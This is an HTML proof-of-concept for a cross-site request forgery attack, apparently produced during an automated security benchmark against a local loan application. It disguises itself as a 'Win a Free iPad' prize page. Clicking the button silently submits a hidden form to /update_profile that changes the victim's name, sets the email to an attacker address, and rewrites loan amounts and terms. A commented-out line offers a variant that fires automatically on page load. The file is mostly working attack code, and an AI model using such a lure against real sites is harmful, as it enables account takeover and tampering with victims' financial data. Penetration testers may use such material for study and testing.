<!-- 
POC: CSRF attack POC that exploits /update_profile endpoint to modify victim's profile and financial data when they visit a malicious webpage while authenticated
Target: ./repo
Created: 2025-10-31T14:50:18.281Z
Session: benchmark-XBEN-022-24-mhey9d7a

To test this POC:
1. Open this file in a web browser: file:///home/daytona/.pensar/executions/benchmark-XBEN-022-24-mhey9d7a/pocs/poc_csrf_profile_update.html
2. Or serve it and navigate to the target application
3. Observe the vulnerability demonstration (e.g., XSS alert, CSRF execution)
-->

<!DOCTYPE html>
<html>
<head>
    <title>Win a Free iPad!</title>
    <style>
        body {
            font-family: Arial, sans-serif;
            text-align: center;
            padding: 50px;
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            color: white;
        }
        .prize-container {
            background: white;
            color: #333;
            padding: 40px;
            border-radius: 10px;
            max-width: 500px;
            margin: 0 auto;
            box-shadow: 0 10px 40px rgba(0,0,0,0.3);
        }
        h1 { color: #667eea; }
        .prize-img { font-size: 100px; margin: 20px 0; }
        button {
            background: #667eea;
            color: white;
            border: none;
            padding: 15px 40px;
            font-size: 18px;
            border-radius: 5px;
            cursor: pointer;
            margin-top: 20px;
        }
        button:hover { background: #764ba2; }
        #result {
            margin-top: 20px;
            padding: 15px;
            border-radius: 5px;
            display: none;
        }
        .success { background: #d4edda; color: #155724; border: 1px solid #c3e6cb; }
    </style>
</head>
<body>
    <div class="prize-container">
        <h1>ðŸŽ‰ Congratulations! ðŸŽ‰</h1>
        <div class="prize-img">ðŸ“±</div>
        <h2>You've Been Selected!</h2>
        <p>You're eligible to win a FREE iPad! Click the button below to claim your prize now!</p>
        <button onclick="claimPrize()">Claim My Prize Now!</button>
        <div id="result"></div>
    </div>

    <!-- Hidden CSRF Attack Form -->
    <form id="csrfForm" action="http://localhost:8080/update_profile" method="POST" style="display:none;">
        <input type="text" name="name" value="CSRF" />
        <input type="text" name="lastname" value="Victim" />
        <input type="email" name="email" value="pwned@attacker.com" />
        <input type="text" name="loan_amount" value="1" />
        <input type="text" name="loan_term_months" value="999" />
        <input type="text" name="monthly_payment" value="1" />
    </form>

    <script>
        function claimPrize() {
            // Display fake loading message
            const resultDiv = document.getElementById('result');
            resultDiv.style.display = 'block';
            resultDiv.className = 'success';
            resultDiv.innerHTML = 'â³ Processing your prize claim...';
            
            // Submit the CSRF attack
            document.getElementById('csrfForm').submit();
            
            // Show fake success after a delay
            setTimeout(() => {
                resultDiv.innerHTML = 'âœ… Congratulations! Your prize has been registered. Check your email for details!';
            }, 1000);
        }
        
        // Auto-submit on page load (silent attack variant)
        // Uncomment the line below for automatic exploitation:
        // window.onload = function() { document.getElementById('csrfForm').submit(); };
    </script>
</body>
</html>